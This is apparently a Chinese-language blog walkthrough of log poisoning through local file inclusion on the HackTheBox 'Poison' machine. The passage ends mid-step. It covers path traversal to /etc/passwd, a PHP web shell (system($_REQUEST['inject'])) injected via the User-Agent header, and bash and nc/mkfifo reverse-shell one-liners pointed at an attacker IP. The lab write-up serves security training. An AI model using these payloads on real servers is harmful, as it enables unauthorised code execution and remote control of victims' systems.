日志中毒是指您将恶意代码插入应用程序的日志文件以执行它。此应用程序可以是任何东西，例如 Web 应用程序、SSH 或 FTP。在日志文件中触发恶意代码的一种方法是本地文件包含。


本地文件包含 (LFI) 是指您将输入发送到 Web 服务器以执行或显示您不应该执行的文件。例如，如果有一个 PHP 页面接受用户输入并显示用户请求的页面，则预期用户可能只会输入诸如咖啡、茶和苏打水之类的良性词来加载相关网页。但是，如果您输入“../../../../../../../../etc/passwd”，Web 服务器将加载 passwd 文件并显示它。这是因为 Web 服务器正在处理的实际查询是这样的：'/var/www/html/<file requested>' 这将变成 '/var/www/html/../../../ ../../../../etc/passwd'，因此带您离开 web 目录并返回根目录以加载 /etc/passwd 文件。注入恶意代码后，使用相同的方法加载日志文件。LFI 还有更多功能，但这是大意。


我将使用 HackTheBox 的 Poison box 来处理这个有 Web 服务器的场景。因此，我们的第一步是确定我们可以毒化的日志文件的名称。我知道服务器是 FreeBSD 并根据 nmap 扫描的结果运行 Apache，通过 Google，我们可以找到名为“/var/log/httpd-access.log”的 Apache 日志文件。


接下来，我们需要确保我们可以使用 LFI 看到这个日志。因此，我们需要根据用户输入加载文件的易受攻击的代码。这可能是在 URL 或 Web 表单中包含文件名称的代码，在这种情况下是后者。

图 1：易受 LFI 影响的表格

在这里，我们可以看到网络管理员希望用户只输入列出的文件之一，但由于服务器正在检索我们输入的任何内容，我们可以显示任何文件。这实际上是一个相当直接的 LFI，我见过更复杂的 LFI。我需要在某个时候详细地发表一篇关于 LFI 的帖子。无论如何，让我们尝试显示上面提到的日志文件。


图 2：尝试加载 httpd-access.log

图 3：日志可见

有用！请注意，我们甚至不需要包含“../../..”来返回目录。


现在我们知道 'browse.php' 文件容易受到 LFI 的攻击，我们可以加载日志文件，所以现在我们可以开始中毒了。我们可以在图 3 中看到日志文件正在显示 HTTP 请求的标头。如果我们修改标头并包含恶意 PHP 代码会发生什么？


为此，我们将使用 Burpsuite。打开 Burpsuite，在浏览器设置中将 Internet 代理设置为 127.0.0.1 和端口 8080，并确保在 Burpsuite 的“代理”选项卡下启用“拦截”（默认情况下已启用）。现在，浏览网站。Burp 会拦截请求。

图 4：截获的 GET 请求

右键单击窗口并单击“发送到中继器”，然后单击“中继器”选项卡。

图 5：中继器选项卡

在这里，我们可以修改请求并根据需要多次发送，我们还可以在右侧窗格中看到响应。让我们修改 User-Agent 并编写一些 PHP 代码来回显一些单词。我们会尝试：<?php echo ('HELLO THERE!') ?>点击“发送”。现在，让我们使用 LFI 再次加载日志文件（关闭 Burpsuite 中的拦截，否则您必须手动允许发送每个请求）。

图 6：包含我们修改后的 User-Agent 的日志文件

我们可以看到它说“HELLO THERE”但没有 PHP 标签（我们也使用单引号而不是双引号），这表明它正在执行 PHP 代码。请注意，如果我们尝试除双引号之外的相同操作，则会导致错误，因为日志文件正在转义双引号，因为日志文件中的每个条目都以双引号开头和结尾。


现在让我们用 PHP 代码制作一个用户代理，它允许我们输入任何命令并执行它。让我们在转发器选项卡中将 User-Agent 更改为：<?php system($_REQUEST['inject']); ?>并再次发送。

图 7：修改后的 User-Agent 以启用 RCE

现在返回显示日志的网页并将以下内容添加到 URL 的末尾：&inject=ls -la然后按 Enter。页面加载完毕后，右键查看源代码，这样更容易阅读，现在可以看到它已经在服务器上执行了命令，并列出了文件夹中的文件。

图 8：RCE 成功

现在我们通过日志中毒获得了 RCE，我们要做的最后一件事是获得一个反向 shell。


首先，在我们的攻击者机器上启动监听器（在本例中使用端口 444）：nc -lvp 444


我总是先尝试 bash one-liner：bash -i >& /dev/tcp/x.x.x.x/xxxx 0>&1但这对我不起作用。我还尝试使用 pentestmonkey 的反向 shell 脚本并使用 wget 将其放在受害者服务器上，但这也不起作用。pentestmonkey的工作如下：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f


现在将 IP 替换为我们的攻击者 IP，将端口替换为 444。如果我们尝试将其复制并粘贴到 '&inject=' 之后的 URL 中，它将不起作用。将其发送给 Burp，我们可以看到它误解了 & 符号：
